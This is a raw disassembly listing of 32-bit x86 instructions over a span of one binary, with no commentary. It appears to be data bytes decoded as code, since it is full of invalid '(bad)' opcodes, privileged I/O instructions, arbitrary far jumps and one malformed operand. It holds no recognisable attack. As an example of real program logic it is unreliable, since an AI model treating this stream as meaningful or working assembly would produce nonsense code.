  41d7a7:	or     BYTE PTR [ebx-0x80],ah
  41d7aa:	or     DWORD PTR [esi],edx
  41d7ac:	(bad)  
  41d7ad:	jmp    0xcf9b:0xe8719d79
  41d7b4:	popa   
  41d7b5:	inc    ebx
  41d7b6:	inc    ebx
  41d7b7:	outs   dx,BYTE PTR ds:[esi]
  41d7b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7b9:	mov    ebx,0x9010f5f3
  41d7be:	outs   dx,BYTE PTR ds:[esi]
  41d7bf:	fsubr  st,st(0)
  41d7c1:	fisttp QWORD PTR [ebx-0x52]
  41d7c4:	dec    eax
  41d7c5:	cmp    al,BYTE PTR [ebx+0x53]
  41d7c8:	jmp    0x37736490
  41d7cd:	scas   eax,DWORD PTR es:[edi]
  41d7ce:	jb     0x41d84c
  41d7d0:	addr16 loopne 0x41d839
  41d7d3:	hlt    
  41d7d4:	mov    ds:0x96ebab18,eax
  41d7d9:	sti    
  41d7da:	sbb    bh,BYTE PTR [ecx]
  41d7dc:	inc    esp
  41d7dd:	mov    esp,0x6e85b28c
  41d7e2:	dec    ecx
  41d7e3:	mov    edi,cs
  41d7e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7e6:	retf   0x611b
  41d7e9:	pop    ebx
  41d7ea:	out    dx,eax
  41d7eb:	(bad)  
  41d7ec:	in     eax,0x9f
  41d7ee:	jae    0x41d782
  41d7f0:	(bad)  
  41d7f1:	adc    al,0xaf
  41d7f3:	rcl    BYTE PTR [esi],0x62
  41d7f6:	sbb    eax,0xa291c97b
  41d7fb:	(bad)  
  41d7fc:	jge    0x41d7c5
  41d7fe:	das    
  41d7ff:	fld    QWORD PTR [esi-0x39]
  41d802:	xlat   BYTE PTR ds:[ebx]
  41d803:	xchg   BYTE PTR [ebx],bl
  41d805:	and    edi,ebx
  41d807:	stc    
  41d808:	mov    esi,0xa68d596e
  41d80d:	pop    esi
  41d80e:	xchg   ebp,eax
  41d80f:	mov    eax,ds:0x6d856d1c
  41d814:	sbb    eax,0xb5d01d9a
  41d819:	sbb    BYTE PTR [esi+0x78],0xf2
  41d81d:	fs mov dh,0xaa
  41d820:	jmp    0x8400:0x59e71749
  41d827:	jle    0x41d87a
  41d829:	pop    ebp
  41d82a:	push   ebp
  41d82b:	add    BYTE PTR ds:0xcba359dd,cl
  41d831:	xlat   BYTE PTR gs:[ebx]
  41d833:	into   
  41d834:	inc    ecx
  41d835:	xchg   bl,ch
  41d837:	mov    DWORD PTR [esp+edi*2-0x18],ebx
  41d83b:	xchg   edx,eax
  41d83c:	mov    edi,0x5f0546ae
  41d841:	dec    esp
  41d842:	xor    al,0x65
  41d844:	fld    TBYTE PTR [eax-0x69]
  41d847:	imul   ebp,DWORD PTR [ebp-0x7d762b9f],0x53
  41d84e:	xchg   esp,eax
  41d84f:	shr    BYTE PTR [ebx+0x30],1
  41d852:	into   
  41d853:	lea    ebx,[esp+edx*1]
  41d856:	mov    esp,DWORD PTR [ebp+0x5d]
  41d859:	inc    eax
  41d85a:	shl    BYTE PTR [ebx-0x4f8dc950],cl
  41d860:	paddq  mm7,QWORD PTR [ebx+0x6da1de2b]
  41d867:	out    0x7e,al
  41d869:	das    
  41d86a:	arpl   WORD PTR [ebx],bp
  41d86c:	int    0x25
  41d86e:	aas    
  41d86f:	ja     0x41d88f
  41d871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d872:	dec    ecx
  41d873:	push   ebp
  41d874:	add    al,0x22
  41d876:	add    eax,DWORD PTR [edx]
  41d878:	inc    esp
  41d879:	bt     ecx,eax
  41d87c:	mov    ch,0xb
  41d87f:	push   esi
  41d880:	(bad)  
  41d881:	sbb    eax,0xc6155005
  41d886:	or     al,0xb3
  41d888:	addr16 mov ds:0xf9d5,al
  41d88c:	dec    ebp
  41d88d:	jae    0x41d8a4
  41d88f:	popf   
  41d890:	imul   esi,DWORD PTR [esi+0x25d8e7b0],0xffffffd4
  41d897:	sub    bh,0x23
  41d89a:	push   edi
  41d89b:	call   0x3624:0xf056bb55
  41d8a2:	leave  
  41d8a3:	xlat   BYTE PTR ds:[ebx]
  41d8a4:	stos   BYTE PTR es:[edi],al
  41d8a5:	mov    bh,0xcc
  41d8a7:	or     DWORD PTR [esi-0x5fa76d9],edx
  41d8ad:	mov    ah,0x1c
  41d8af:	cld    
  41d8b0:	(bad)  [ecx+0x1c]
  41d8b3:	retf   
  41d8b4:	pop    esi
  41d8b5:	inc    ebp
  41d8b6:	cmp    eax,0x1c09fcc6
  41d8bb:	cmc    
  41d8bc:	mov    esi,DWORD PTR [eax+0x2c]
  41d8bf:	xchg   ecx,eax
  41d8c0:	adc    cl,bl
  41d8c2:	push   ds
  41d8c3:	shl    edi,1
  41d8c5:	mov    ebx,DWORD PTR [esi+0x17]
  41d8c8:	dec    esp
  41d8c9:	sbb    ah,dh
  41d8cb:	and    bl,BYTE PTR [ebp+0x8]
  41d8ce:	adc    bh,BYTE PTR [esi-0x4a8a901b]
  41d8d4:	mov    ebp,edx
  41d8d6:	test   DWORD PTR [ebx*2-0x3c2e2754],edx
  41d8dd:	sub    cl,dl
  41d8df:	or     al,0x5c
  41d8e1:	test   al,0x9d
  41d8e3:	cwde   
  41d8e4:	dec    esp
  41d8e5:	leave  
  41d8e6:	pushf  
  41d8e7:	cmp    DWORD PTR [eax+eiz*8],edx
  41d8ea:	xlat   BYTE PTR ds:[ebx]
  41d8eb:	mov    al,ds:0xce11c282
  41d8f0:	call   0x3a09:0x39079494
  41d8f7:	xor    BYTE PTR [ebx-0x74b1b06f],cl
  41d8fd:	pop    esi
  41d8fe:	jle    0x41d8cd
  41d900:	add    al,0xae
  41d902:	in     al,0xd0
  41d904:	ins    BYTE PTR es:[edi],dx
  41d905:	out    dx,eax
  41d906:	push   eax
  41d907:	mov    bl,0xef
  41d909:	mov    al,0xdb
  41d90b:	adc    eax,0x7a9fcb8
  41d910:	popa   
  41d911:	pop    es
  41d912:	in     al,dx
  41d913:	fsubr  DWORD PTR [esp+ecx*4-0x70]
  41d917:	jle    0x41d983
  41d919:	cmp    DWORD PTR [ecx+0x67],esp
  41d91c:	or     ch,BYTE PTR ds:0x2c55b432
  41d922:	sti    
  41d923:	sbb    DWORD PTR [eax],eax
  41d925:	es call 0xd382a24c
  41d92b:	into   
  41d92c:	or     BYTE PTR [ecx],cl
  41d92e:	test   eax,0x4fcda751
  41d933:	mov    ebx,0x2afa5b00
  41d938:	out    0xc9,eax
  41d93a:	ins    BYTE PTR es:[edi],dx
  41d93b:	fnsave [edx+0x40]
  41d93e:	jp     0x41d914
  41d940:	loop   0x41d905
  41d942:	dec    edi
  41d943:	mov    ds:0x3644ef07,eax
  41d948:	ss pop esi
  41d94a:	ins    DWORD PTR es:[edi],dx
  41d94b:	cmp    eax,0xddca7e57
  41d950:	loopne 0x41d903
  41d952:	sub    ebp,esi
  41d954:	(bad)  
  41d955:	pop    edi
  41d956:	test   BYTE PTR [ebx-0x21ec88a4],al
  41d95c:	fnstenv ds:0x59acf503
  41d962:	ret    0x5b45
  41d965:	jno    0x41d8e7
  41d967:	inc    DWORD PTR [edx-0x2ec35b7b]
  41d96d:	xor    bl,ch
  41d96f:	repz test al,0x30
  41d972:	fisttp DWORD PTR [ebp-0x13]
  41d975:	std    
  41d976:	mov    edi,0xd94c4f49
  41d97b:	cld    
  41d97c:	cmp    ah,BYTE PTR [edi-0x5c]
  41d97f:	mov    bh,0xca
  41d981:	out    0x8f,al
  41d983:	cmp    al,0xd9
  41d985:	retf   
  41d986:	ficomp WORD PTR [ecx+0x253117c2]
  41d98c:	(bad)  
  41d98d:	pop    esp
  41d98e:	push   esp
  41d98f:	xor    BYTE PTR [esi],0xe5
  41d992:	inc    ecx
  41d993:	jb     0x41d942
  41d995:	cmp    al,0x60
  41d997:	ror    ah,1
  41d999:	getsec 
  41d99b:	jb     0x41d9b5
  41d99d:	or     edx,DWORD PTR [ecx-0x7e6f0c2a]
  41d9a3:	hlt    
  41d9a4:	repnz scas al,BYTE PTR es:[edi]
  41d9a6:	xor    al,bh
  41d9a8:	mov    edx,0x11c695a9
  41d9ad:	pop    edi
  41d9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9af:	and    eax,0x1035f5b2
  41d9b4:	add    eax,0x6bee674d
  41d9b9:	fistp  QWORD PTR [esi]
  41d9bb:	cmovo  ebx,DWORD PTR [edx+0x1a3df02f]
  41d9c2:	arpl   WORD PTR [ecx-0x2a],di
  41d9c5:	adc    al,0x56
  41d9c7:	push   DWORD PTR [eax]
  41d9c9:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d9cb:	aam    0xd4
  41d9cd:	pop    es
  41d9ce:	aam    0x87
  41d9d0:	jbe    0x41d969
  41d9d2:	cwde   
  41d9d3:	(bad)  
  41d9d4:	(bad)  
  41d9d5:	ror    DWORD PTR [edi-0xb3a16a2],1
  41d9db:	sub    DWORD PTR [edx],0x1c
  41d9de:	maskmovq mm3,mm4
  41d9e1:	add    cl,BYTE PTR [esi]
  41d9e3:	fild   DWORD PTR [ebp+eiz*2+0x31]
  41d9e7:	in     al,dx
  41d9e8:	xor    eax,0x3e55c76a
  41d9ed:	jns    0x41da11
  41d9ef:	(bad)  
  41d9f2:	or     dh,BYTE PTR [ecx+ebp*8]
  41d9f5:	pop    ebp
  41d9f6:	push   esi
  41d9f7:	sbb    eax,0xc031d0ae
  41d9fc:	xor    edi,esp
  41d9fe:	lods   eax,DWORD PTR ds:[esi]
  41d9ff:	mov    ebp,0x1a67efa5
  41da04:	ds sub al,0x3b
  41da07:	fs pop ebx
  41da09:	shl    edi,1
  41da0b:	fwait
  41da0c:	lods   al,BYTE PTR ds:[esi]
  41da0d:	xchg   BYTE PTR [edx+0x68],dl
  41da10:	mov    dl,0x9b
  41da12:	lea    ebp,ds:0xf93e3072
  41da18:	inc    edi
  41da19:	jp     0x41d9a2
  41da1b:	xor    BYTE PTR [esi+ebp*4+0x4e2a455c],al
  41da22:	ret    0x9918
  41da25:	and    ebp,DWORD PTR [esi+0x7b7f2ae9]
  41da2b:	xchg   ebx,eax
  41da2c:	xchg   edx,eax
  41da2d:	jo     0x41da61
  41da2f:	push   ebx
  41da30:	cwde   
  41da31:	fdiv   DWORD PTR [ebp+0x58]
  41da34:	push   edi
  41da35:	mov    eax,fs:0xd42d30a2
  41da3b:	arpl   WORD PTR [ebx],di
  41da3d:	retf   0xea51
  41da40:	in     al,dx
  41da41:	push   0x52
  41da43:	enter  0xcf69,0xe5
  41da47:	stc    
  41da48:	or     DWORD PTR [eax],ebp
  41da4a:	push   ds
  41da4b:	clc    
  41da4c:	test   eax,0xaaf2024b
  41da51:	jmp    0x94ee:0xb5fde9af
  41da58:	xor    eax,0x6a6a3753
  41da5d:	je     0x41d9f6
  41da5f:	inc    edi
  41da60:	addr16 or ecx,ebp
  41da63:	aas    
  41da64:	arpl   WORD PTR [eax-0x50dd5bf3],cx
  41da6a:	dec    edi
  41da6b:	cmp    bl,BYTE PTR [edi-0x1fdb806d]
  41da71:	hlt    
  41da72:	push   edx
  41da73:	jmp    0x8e4c:0x2e7ba226
  41da7a:	push   esp
  41da7b:	xchg   edx,eax
  41da7c:	pushf  
  41da7d:	ins    DWORD PTR es:[edi],dx
  41da7e:	xor    BYTE PTR [eax+0x6b],ch
  41da81:	pop    ds
  41da82:	pop    eax
  41da83:	push   esp
  41da84:	adc    BYTE PTR [ebp-0x9],dl
  41da87:	dec    eax
  41da88:	ror    DWORD PTR [ebp+0x43572534],1
  41da8e:	mov    ds:0x46e1291e,eax
  41da93:	jg     0x41da57
  41da95:	lods   eax,DWORD PTR ds:[esi]
  41da96:	mov    al,ds:0xb228253f
  41da9b:	jle    0x41dadf
  41da9d:	mov    ebx,0xf2897739
  41daa2:	push   ss
  41daa3:	xchg   ebx,eax
  41daa4:	add    eax,0xac046c1e
  41daa9:	lds    edx,FWORD PTR [edi+0x3f]
  41daac:	inc    ecx
  41daad:	adc    edi,0x7f
  41dab0:	fist   DWORD PTR [edi-0x2d]
  41dab3:	mov    ch,0xc0
  41dab5:	jne    0x41dabd
  41dab7:	xchg   ecx,eax
  41dab8:	and    BYTE PTR [ebp-0x79],al
  41dabb:	int3   
  41dabc:	sub    BYTE PTR [ecx+0x5f],0x97
  41dac0:	pop    esp
  41dac1:	inc    esi
  41dac2:	scas   eax,DWORD PTR es:[edi]
  41dac3:	ins    DWORD PTR es:[edi],dx
  41dac4:	fistp  QWORD PTR [edx-0x10]
  41dac7:	out    dx,eax
  41dac8:	push   ebx
  41dac9:	and    BYTE PTR [eax],cl
  41dacb:	and    DWORD PTR [esi+0x36],ecx
  41dace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dacf:	aam    0x2a
  41dad1:	popf   
  41dad2:	adc    edi,ebx
  41dad4:	in     al,dx
  41dad5:	int3   
  41dad6:	(bad)  
  41dad7:	xchg   ebx,eax
  41dad8:	push   ecx
  41dad9:	xchg   esi,eax
  41dada:	jnp    0x41da71
  41dadc:	cmp    ebx,DWORD PTR [edx+0x5e]
  41dadf:	rcr    DWORD PTR [edi],0xbe
  41dae2:	rcr    ebx,0xd
  41dae5:	lahf   
  41dae6:	(bad)  
  41dae7:	stc    
  41dae8:	ins    BYTE PTR es:[edi],dx
  41dae9:	mov    ds:0xe22d707,eax
  41daee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daef:	xchg   DWORD PTR [ecx-0x5674fc26],edx
  41daf5:	mov    bh,0xb7
  41daf7:	imul   BYTE PTR [eax]
  41daf9:	dec    ebp
  41dafa:	shl    eax,1
  41dafc:	sub    DWORD PTR [ebp+edx*2-0x6c7de712],ebp
  41db03:	inc    edx
  41db04:	mov    ds:0x20c212a0,al
  41db09:	xor    BYTE PTR [edx+0x37db79af],al
  41db0f:	jae    0x41dac6
  41db11:	cs pop esp
  41db13:	inc    esi
  41db14:	pop    eax
  41db15:	adc    esi,edx
  41db17:	call   0xffa14fa
  41db1c:	sub    al,0x8e
  41db1e:	and    dh,BYTE PTR [ecx+0x16]
  41db21:	test   DWORD PTR [edi-0x45234f8d],ebx
  41db27:	lods   eax,DWORD PTR ds:[esi]
  41db28:	push   0xffffffd8
  41db2a:	shr    BYTE PTR [eax+0x4f2de338],1
  41db30:	lods   al,BYTE PTR ds:[esi]
  41db31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db32:	cwde   
  41db33:	cmc    
  41db34:	repnz sbb al,0xa8
  41db37:	cmp    al,0x79
  41db39:	mov    ds:0x8865ff97,al
  41db3e:	xor    ah,bl
  41db40:	in     eax,dx
  41db41:	retf   
  41db42:	sbb    ah,BYTE PTR [edi]
  41db44:	repnz sub bh,BYTE PTR [ebx+0x2019543d]
  41db4b:	mov    DWORD PTR [edx],edx
  41db4d:	push   ds
  41db4e:	mov    dl,0x7d
  41db50:	mov    ebp,0x94b7f2ea
  41db55:	dec    ebp
  41db56:	in     al,0x6f
  41db58:	(bad)  
  41db59:	jl     0x41daff
  41db5b:	fcom   DWORD PTR [edx-0x7458199e]
  41db61:	push   eax
  41db62:	xchg   ebp,eax
  41db63:	push   es
  41db64:	xor    al,0x5f
  41db66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db67:	scas   eax,DWORD PTR es:[edi]
  41db68:	mov    DWORD PTR [ebx],ebp
  41db6a:	mov    al,0x48
  41db6c:	dec    edx
  41db6d:	jge    0x41db56
  41db6f:	neg    BYTE PTR [ebx+0x6d]
  41db72:	adc    eax,0xb48fb0b1
  41db77:	add    DWORD PTR [esi+eiz*8],esp
  41db7a:	push   es
  41db7b:	inc    esp
  41db7c:	push   0x266e7c25
  41db81:	inc    ebp
  41db82:	stc    
  41db83:	mov    ebp,0xa796788
  41db88:	xor    al,bh
  41db8a:	cmp    al,0x89
  41db8c:	add    al,0x65
  41db8e:	pushf  
  41db8f:	adc    al,0x7e
  41db91:	cwde   
  41db92:	adc    BYTE PTR [ebp+0x1c698d94],cl
  41db98:	daa    
  41db99:	addr16 add ch,bl
  41db9c:	cmp    dl,BYTE PTR [edx-0x57]
  41db9f:	ins    BYTE PTR es:[edi],dx
  41dba0:	xchg   esi,eax
  41dba1:	sar    BYTE PTR [edx+0x4a],0x2a
  41dba5:	clc    
  41dba6:	add    bl,BYTE PTR [si-0x7b]
  41dbaa:	sbb    dl,BYTE PTR [edx+0x7d]
  41dbad:	stos   BYTE PTR es:[edi],al
  41dbae:	and    ebx,esi
  41dbb0:	mov    eax,ds:0xb00e8765
  41dbb5:	lds    esp,FWORD PTR [ecx+0x48bfe58e]
  41dbbb:	and    DWORD PTR [ecx-0x5ec57531],eax
  41dbc1:	or     al,0x80
  41dbc3:	in     eax,0x57
  41dbc5:	push   ecx
  41dbc6:	stos   BYTE PTR es:[edi],al
  41dbc7:	sbb    DWORD PTR [edx+0x39],0x42
  41dbcb:	add    BYTE PTR [ebp-0x1],cl
  41dbce:	adc    dh,BYTE PTR [esp+edx*2-0x2d1dcabd]
  41dbd5:	or     ecx,DWORD PTR ss:[edx+ebx*8-0x74287829]
  41dbdd:	mov    ds:0xb43376d1,eax
  41dbe2:	pop    ss
  41dbe3:	lock mov dh,cl
  41dbe6:	add    edx,ecx
  41dbe8:	fstp   QWORD PTR [edi+ecx*4+0x5a]
  41dbec:	adc    DWORD PTR [esi],edx
  41dbee:	jmp    0xe66b:0xdec8d844
  41dbf5:	arpl   WORD PTR [edx-0x49b7909e],sp
  41dbfb:	adc    DWORD PTR [ecx-0x1b84e16b],esi
  41dc01:	loop   0x41dbeb
  41dc03:	fldcw  WORD PTR [ebx-0x628d0f6f]
  41dc09:	cdq    
  41dc0a:	cld    
  41dc0b:	sub    esp,DWORD PTR [ebp-0x4d]
  41dc0e:	jae    0x41dc0a
  41dc10:	add    al,0xee
  41dc12:	aaa    
  41dc13:	cdq    
  41dc14:	bound  ecx,QWORD PTR [ebp-0x3d]
  41dc17:	sahf   
  41dc18:	push   eax
  41dc19:	(bad)  
  41dc1a:	(bad)  
  41dc1b:	mov    edx,0xfcde1a4f
  41dc20:	iret   
  41dc21:	mov    al,0xa7
  41dc23:	sub    dl,0x9
  41dc26:	push   ebp
  41dc27:	dec    edx
  41dc28:	mov    ebx,0x7b4d06c8
  41dc2d:	lds    esi,FWORD PTR [edx+edx*2-0x64]
  41dc31:	pminub mm7,mm0
  41dc34:	stos   BYTE PTR es:[edi],al
  41dc35:	les    edi,FWORD PTR ds:[ebp-0x2b]
  41dc39:	mov    ecx,0xe8ed2aeb
  41dc3e:	inc    ebx
  41dc3f:	xor    ebx,DWORD PTR [eax+0x46]
  41dc42:	rol    DWORD PTR [esp+ebx*1+0x658e855b],cl
  41dc49:	fstp   DWORD PTR [edx+0xb]
  41dc4c:	outs   dx,BYTE PTR ds:[esi]
  41dc4d:	inc    esp
  41dc4e:	int3   
  41dc4f:	sbb    BYTE PTR [eax+0x2c],ch
  41dc52:	dec    esi
  41dc53:	les    edi,FWORD PTR [ebp-0xd]
  41dc56:	and    bl,BYTE PTR [esi+eax*4-0x4aeb47d0]
  41dc5d:	fnsave [edx+edi*4+0x4b]
  41dc61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc62:	xchg   edx,eax
  41dc63:	push   ebx
  41dc64:	cli    
  41dc65:	popf   
  41dc66:	aam    0xd4
  41dc68:	sahf   
  41dc69:	outs   dx,DWORD PTR ds:[esi]
  41dc6a:	popf   
  41dc6b:	aas    
  41dc6c:	adc    edi,DWORD PTR [ecx-0x25bcb107]
  41dc72:	and    edi,DWORD PTR [ecx]
  41dc74:	and    al,dh
  41dc76:	fsub   st,st(2)
  41dc78:	dec    esp
  41dc79:	mov    DWORD PTR [ecx-0x3d],eax
  41dc7c:	mov    ebp,0xf958a354
  41dc81:	imul   edx,DWORD PTR [ebp+eiz*1+0x73914019],0xf223f62e
  41dc8c:	inc    DWORD PTR [eax]
  41dc8e:	dec    ebp
  41dc8f:	idiv   DWORD PTR [eax-0x3d633ca8]
  41dc95:	mov    esp,0xa6435529
  41dc9a:	pop    edi
  41dc9b:	das    
  41dc9c:	test   esi,esp
  41dc9e:	jge    0x41dc2e
  41dca0:	push   0x34f60647
  41dca5:	jns    0x41dc9d
  41dca7:	jecxz  0x41dcc2
  41dca9:	jp     0x41dc39
  41dcab:	sar    BYTE PTR [ecx+ebx*4],1
  41dcae:	inc    edi
  41dcaf:	or     eax,0xdbd69c12
  41dcb5:	xchg   edi,eax
  41dcb6:	jb     0x41dcd5
  41dcb8:	js     0x41dcf2
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	test   eax,0xc15f9d5
  41dcc0:	and    eax,0x778b9eda
  41dcc5:	add    BYTE PTR [edi-0x40c20c09],ah
  41dccb:	sbb    BYTE PTR [edi+0x0],dl
  41dcce:	sub    ch,ah
  41dcd0:	xor    BYTE PTR [edx],bl
  41dcd2:	fdivr  DWORD PTR [eax+0x4]
  41dcd5:	sub    eax,0x7340e6ab
  41dcda:	xchg   ebp,eax
  41dcdb:	fwait
  41dcdc:	sbb    al,0x5
  41dcde:	and    ah,bl
  41dce0:	not    DWORD PTR [edx-0x3336b380]
  41dce6:	outs   dx,DWORD PTR ds:[esi]
  41dce7:	in     al,dx
  41dce8:	cli    
  41dce9:	inc    ebp
  41dcea:	loope  0x41dc97
  41dcec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dced:	jae    0x41dd1b
  41dcef:	sub    dl,BYTE PTR [esi-0x76]
  41dcf2:	xor    dl,bh
  41dcf4:	or     ebp,DWORD PTR [ebx-0x7ea33d12]
  41dcfa:	push   eax
  41dcfb:	mov    eax,0xeb5a5740
  41dd00:	mov    ?,WORD PTR [esi+edi*2]
  41dd03:	pop    ebx
  41dd04:	cdq    
  41dd05:	out    0xd1,eax
  41dd07:	ja     0x41dcc8
  41dd09:	jb     0x41dcc8
  41dd0b:	fwait
  41dd0c:	inc    edi
  41dd0d:	leave  
  41dd0e:	ret    0xf50f
  41dd11:	shr    DWORD PTR [ebx],1
  41dd13:	jmp    0x41dd5c
  41dd15:	mov    WORD PTR [esi+0x32],ds
  41dd18:	push   ebp
  41dd19:	add    DWORD PTR [edi+0x1fc6d5e6],0xd6211861
  41dd23:	pop    ebp
  41dd24:	pop    eax
  41dd25:	or     dl,BYTE PTR [ebp+0x4]
  41dd28:	cli    
  41dd29:	mov    eax,ds:0xb638e596
  41dd2e:	jns    0x41dcda
  41dd30:	xor    BYTE PTR ds:0x404c15b0,dh
  41dd36:	jns    0x41dccc
  41dd38:	(bad)  [eax-0x3]
  41dd3b:	pop    esi
  41dd3c:	cdq    
  41dd3d:	xor    ecx,esp
  41dd3f:	sbb    edi,edx
  41dd41:	mov    dh,0x52
  41dd43:	lea    ebp,[ecx+0x3d509399]
  41dd49:	jo     0x41dcf0
  41dd4b:	out    0xdd,eax
  41dd4d:	dec    edx
  41dd4e:	hlt    
  41dd4f:	scas   eax,DWORD PTR es:[edi]
  41dd50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd51:	push   cs
  41dd52:	repnz fcom QWORD PTR [edx-0x1943ecec]
  41dd59:	addr16 xor dl,ah
  41dd5c:	inc    ecx
  41dd5d:	cmp    eax,0xdfa0c3ba
  41dd62:	js     0x41ddd6
  41dd64:	mov    bh,0xe5
  41dd66:	or     al,0x5a
  41dd68:	mov    eax,ds:0xfe92c514
  41dd6d:	add    BYTE PTR [esi],cl
  41dd6f:	pop    eax
  41dd70:	enter  0x6d4b,0x94
  41dd74:	cmp    DWORD PTR [edx-0x674d790f],esi
  41dd7a:	aad    0x25
  41dd7c:	retf   0x8f0d
  41dd7f:	mov    ch,0xe0
  41dd81:	push   ecx
  41dd82:	jae    0x41dd8e
  41dd84:	xchg   DWORD PTR [edi],edi
  41dd86:	xchg   esi,eax
  41dd87:	int    0x12
  41dd89:	xchg   edx,eax
  41dd8a:	jle    0x41ddb4
  41dd8c:	and    DWORD PTR [edx+0x5e1e615d],esp
  41dd92:	pushf  
  41dd93:	mov    esi,0xbcf68018
  41dd98:	cmc    
  41dd99:	outs   dx,DWORD PTR ds:[esi]
  41dd9a:	bnd jg 0x41ddf1
  41dd9d:	jae    0x41ddd2
  41dd9f:	mov    ah,0x6f
  41dda1:	leave  
  41dda2:	mov    esp,0xa49d96e4
  41dda7:	mov    esi,0xf4bd55d8
  41ddac:	je     0x41dd3f
  41ddae:	push   es
  41ddaf:	push   eax
  41ddb0:	xchg   ebx,eax
  41ddb1:	adc    DWORD PTR [esi+0x34d86432],ebx
  41ddb7:	xchg   BYTE PTR [edi+0x10],cl
  41ddba:	push   es
  41ddbb:	rcr    DWORD PTR [eax],0x28
  41ddbe:	add    al,0x8b
  41ddc0:	xchg   dl,bl
  41ddc2:	cwde   
  41ddc3:	sbb    al,0x69
  41ddc5:	mov    eax,0x57c02bd4
  41ddca:	add    eax,0x3557312
  41ddcf:	in     al,dx
  41ddd0:	xor    al,0x48
  41ddd2:	fisub  DWORD PTR [esi+0x52]
  41ddd5:	outs   dx,DWORD PTR ds:[esi]
  41ddd6:	or     esp,edi
  41ddd8:	add    edi,DWORD PTR [ecx+0x7e47277a]
  41ddde:	clc    
  41dddf:	push   ebx
  41dde0:	mov    bl,0x23
  41dde2:	nop
  41dde3:	std    
  41dde4:	push   esp
  41dde5:	in     al,0x15
  41dde7:	or     eax,0x4af1516f
  41ddec:	add    ah,BYTE PTR [ecx+0x76]
  41ddef:	jg     0x41ddb7
  41ddf1:	jle    0x41ddb1
  41ddf3:	push   ecx
  41ddf4:	or     ebx,DWORD PTR [esp+eiz*8]
  41ddf7:	jge    0x41ddd3
  41ddf9:	dec    ebp
  41ddfa:	fld    DWORD PTR [ecx+0x5c]
  41ddfd:	xchg   ebp,eax
  41ddfe:	cwde   
  41ddff:	fld    st(0)
  41de01:	inc    eax
  41de02:	js     0x41dd90
  41de04:	adc    al,BYTE PTR [edx-0x12]
  41de07:	in     eax,dx
  41de08:	enter  0xd6c3,0xd4
  41de0c:	sub    BYTE PTR [ecx+esi*2],dh
  41de0f:	xor    esp,0x9
  41de12:	fisub  WORD PTR [ebp-0x8bbd1fc]
  41de18:	push   esp
  41de19:	into   
  41de1a:	jp     0x41ddd8
  41de1c:	loopne 0x41de4d
  41de1e:	inc    eax
  41de1f:	nop
  41de20:	cmp    edx,DWORD PTR [esi+0x217f6489]
  41de26:	cmp    bl,BYTE PTR [edx+ecx*8-0xdfafc74]
  41de2d:	fnstenv [ecx+0x3b3c3a7b]
  41de33:	addr16 into 
  41de35:	sub    DWORD PTR [ecx],ebp
  41de37:	je     0x41ddda
  41de39:	fstp   DWORD PTR [ebp+0x6d]
  41de3c:	or     dl,BYTE PTR [eax]
  41de3e:	divps  xmm4,XMMWORD PTR [ebx]
  41de41:	push   esi
  41de42:	in     eax,dx
  41de43:	adc    BYTE PTR [ecx+0x75],bh
  41de46:	cld    
  41de47:	or     DWORD PTR [ecx-0x519cdb47],eax
  41de4d:	not    DWORD PTR [esi]
  41de4f:	pop    ecx
  41de50:	orpd   xmm4,XMMWORD PTR [ebx]
  41de54:	into   
  41de55:	add    al,0x96
  41de57:	mov    eax,0x6b881c79
  41de5c:	mov    al,ds:0xb92a0c55
  41de61:	repz out 0xa,al
  41de64:	dec    ebx
  41de65:	rcr    BYTE PTR [bx+di],1
  41de68:	or     BYTE PTR [esi],al
  41de6a:	add    edx,DWORD PTR [eax-0x58]
  41de6d:	outs   dx,DWORD PTR ds:[esi]
  41de6e:	dec    esp
  41de6f:	sar    esi,1
  41de71:	lods   eax,DWORD PTR ds:[esi]
  41de72:	lods   al,BYTE PTR ds:[esi]
  41de73:	and    esp,ecx
  41de75:	pop    ebp
  41de76:	xor    DWORD PTR [edi-0x2e],0x63483357
  41de7d:	jecxz  0x41de64
  41de7f:	and    ebx,DWORD PTR [eax]
  41de81:	imul   ebx,DWORD PTR [ecx-0x62a13763]
  41de88:	(bad)  
  41de89:	mov    bl,0x5f
  41de8b:	je     0x41de6e
  41de8d:	mov    ecx,0x386f957c
  41de92:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41de94:	adc    edi,DWORD PTR [ebp+edi*4+0x57]
  41de98:	mov    al,ds:0x7cd7385d
  41de9d:	fbld   TBYTE PTR [ecx]
  41de9f:	stos   DWORD PTR es:[edi],eax
  41dea0:	push   ecx
  41dea1:	les    eax,FWORD PTR [edx]
  41dea3:	jae    0x41de59
  41dea5:	jnp    0x41de39
  41dea7:	push   edx
  41dea8:	mov    al,0xa0
  41deaa:	pop    ss
  41deab:	fidivr WORD PTR [edx+edi*1+0xf]
  41deaf:	mov    bl,0xad
  41deb1:	test   dh,ch
  41deb3:	je     0x41de49
  41deb5:	mov    cl,BYTE PTR [edx]
  41deb7:	jg     0x41de98
  41deb9:	stos   DWORD PTR es:[edi],eax
  41deba:	icebp  
  41debb:	jmp    0x6b69:0xa9f51c86
  41dec2:	lahf   
  41dec3:	jmp    0x41de92
  41dec5:	or     DWORD PTR ds:0xe736b0d4,ecx
  41decb:	hlt    
  41decc:	or     DWORD PTR [ebp-0x39],esp
  41decf:	mov    dl,0xc6
  41ded1:	jmp    0x41df4b
  41ded3:	add    al,0x50
  41ded5:	out    dx,al
  41ded6:	loope  0x41de75
  41ded8:	bound  ecx,QWORD PTR [ecx-0x3d]
  41dedb:	cmp    BYTE PTR [esi-0x49],dl
  41dede:	dec    esp
  41dedf:	imul   edx,eax,0x924ce1bd
  41dee5:	ins    DWORD PTR es:[edi],dx
  41dee6:	out    0x4c,eax
  41dee8:	ror    DWORD PTR gs:[edi+0x30],cl
